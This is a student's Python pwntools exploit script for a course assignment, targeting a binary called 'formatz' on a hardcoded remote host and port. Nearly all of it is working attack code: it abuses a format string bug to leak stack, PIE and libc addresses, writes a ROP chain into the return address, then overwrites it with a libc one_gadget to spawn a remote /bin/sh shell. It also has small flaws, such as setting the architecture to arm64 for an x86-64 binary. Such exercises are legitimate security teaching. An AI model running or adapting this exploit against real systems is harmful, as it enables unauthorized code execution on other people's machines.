'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP16: 
File Description:  

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   70) Symbols       No    0               2               formatz


File info:
formatz: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=05a675d5e3199650c2d6eead61f1be6a3aa56f66, for GNU/Linux 3.2.0, not stripped


Radare2:
afl --> list all functions

nc 165.22.46.243 8877
'''

# Import Libraries
from pwn import *

# Setup - External
HOST = "165.22.46.243"
PORT = 8877

# Used to get 
print("ELF OF BINARY:")
elf = ELF("./formatz")

# Knows the context to debug in
DEBUG = False
if(DEBUG):
    context.log_level = "debug"
context.arch = "arm64"
context.binary = elf

# Used by the autopwner as a callback function to find payload
def exec_fmt(payload):
    p = process([elf.path])
    p.sendline(payload)
    return p.recvall()

def main():
    # Determine format string offset automatically --- pulled from CTF writeup, but prevents me from having to find the exact format
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset

    # start process
    # runningProc = process([elf.path])   # local running
    runningProc = remote("165.22.46.243",8877)
    libc = ELF("./libc.so.6")

    # Buffer length to smash, found in C code
    buffer = 0x150

    ##################################################
    #####               LEAK TIME                #####
    ##################################################

    # Pull leak info for GOT leak
    runningProc.recvuntil(b"This stack leak might be useful ")  # Used to differentiate the two leaks sinec both have similar wording
    GOTLeak = runningProc.recvuntil(b"\n")
    print("GOT LEAK: ", GOTLeak)        # Leak value check
    GOTLeakInt = int(GOTLeak, 16)

    # Pull leak info for Main leakThis stack leak might be useful
    runningProc.recvuntil(b"And this PIE leak might be useful ")
    PIELeak = runningProc.recvuntil(b"\n")
    print("PIE LEAK: ", PIELeak)        # Leak value check
    PIELeakInt = int(PIELeak, 16)

    # Find base of main by taking main addr - address in binary
    elf.address = PIELeakInt - elf.symbols.main

    # The offset to RIP is calculated as following
    InstrPtr = GOTLeakInt + buffer + 8 # 8 = RBP length!
    
    # We make use of this useful gadget
    pop_rdi = elf.address + 0x00000000000012bb # pop rdi; ret;

    # This is the GOT leak location from above, want to call puts again to ensure next leak is called in ROP
    leak_func = 'setvbuf'
    
    # pretty much takes offset, then addes the rest of the functions to it
    payload = fmtstr_payload(offset, {InstrPtr: pop_rdi, InstrPtr+8: elf.got[leak_func], InstrPtr+16: elf.symbols['puts'], InstrPtr+24: elf.symbols['main']}, write_size='short')

    # Calculate libc leak
    print("SENDING PAYLOAD 1")
    runningProc.sendline(payload)
    runningProc.recvuntil('\x7f')   # Stop here to encapsulate data only required
    # Following line from writeup --- attempted this my way and would always crash, or the offset wouldn't be the start of libc which was annoying
    libcLeak = u64(runningProc.recvuntil('\x7f').ljust(8, b'\x00'))  # Grab up to this byte, then grab until termination, tried this like above and wouldn't work
    print("LIBC LEAK ADDR: ", libcLeak)
    libc.address = libcLeak - libc.sym[leak_func]
    print("START LIBC: ", hex(libc.address))

    # Attempt to launch shell
    # Recapture the leaks again
    # Pull leak info for GOT leak
    runningProc.recvuntil(b"This stack leak might be useful ")  # Used to differentiate the two leaks sinec both have similar wording
    GOTLeak = runningProc.recvuntil(b"\n")
    print("GOT LEAK: ", GOTLeak)        # Leak value check
    GOTLeakInt = int(GOTLeak, 16)

    # Pull leak info for Main leakThis stack leak might be useful
    runningProc.recvuntil(b"And this PIE leak might be useful ")
    PIELeak = runningProc.recvuntil(b"\n")
    print("PIE LEAK: ", PIELeak)        # Leak value check
    PIELeakInt = int(PIELeak, 16)

    # Reset this incase value was mangled!
    InstrPtr = InstrPtr = GOTLeakInt + buffer + 8 # 8 = RBP length!

    # Attempting to find one gadget to launch shell!
    # One gadget cmd: one_gadget libc.so.6
    '''
    LIST OF GADGETS --- all offsets since PIE is on

    └─$ one_gadget libc.so.6
    0xe3b2e execve("/bin/sh", r15, r12)
    constraints:
    [r15] == NULL || r15 == NULL
    [r12] == NULL || r12 == NULL

    0xe3b31 execve("/bin/sh", r15, rdx)
    constraints:
    [r15] == NULL || r15 == NULL
    [rdx] == NULL || rdx == NULL

    0xe3b34 execve("/bin/sh", rsi, rdx)
    constraints:
    [rsi] == NULL || rsi == NULL
    [rdx] == NULL || rdx == NULL
    '''

    onegadget = libc.address + 0xe3b31
    payload = fmtstr_payload(offset, {InstrPtr: onegadget})
    runningProc.sendline(payload)

    # See if get shell!
    runningProc.sendline(payload)
    runningProc.interactive()



# Execute the function main when written
if __name__ == "__main__":
    main()